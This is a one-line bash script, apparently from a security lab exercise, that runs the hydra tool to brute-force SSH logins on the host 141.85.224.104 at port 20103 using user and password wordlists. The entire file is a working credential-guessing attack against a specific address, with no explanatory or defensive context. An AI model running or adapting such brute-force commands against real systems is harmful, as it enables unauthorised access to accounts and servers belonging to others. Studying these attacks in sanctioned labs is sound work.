#!/bin/bash

hydra -L ../../support/service-wordlist/users.txt -P ../../support/service-wordlist/passwords.txt 141.85.224.104 ssh -t 2 -s 20103 -v
